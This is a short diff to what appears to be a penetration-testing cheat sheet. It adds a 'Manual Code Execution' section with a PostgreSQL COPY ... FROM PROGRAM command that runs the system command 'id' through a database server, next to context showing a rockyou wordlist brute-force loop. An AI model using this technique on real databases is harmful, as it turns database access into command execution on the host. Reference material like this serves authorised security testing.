@@ -404,6 +404,11 @@ with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
             break
 ~~~
 
+## Manual Code Execution
+
+~~~ sql
+COPY cmd_output FROM PROGRAM 'id';
+~~~
 
 # WINRM - 5985 - 5986
 
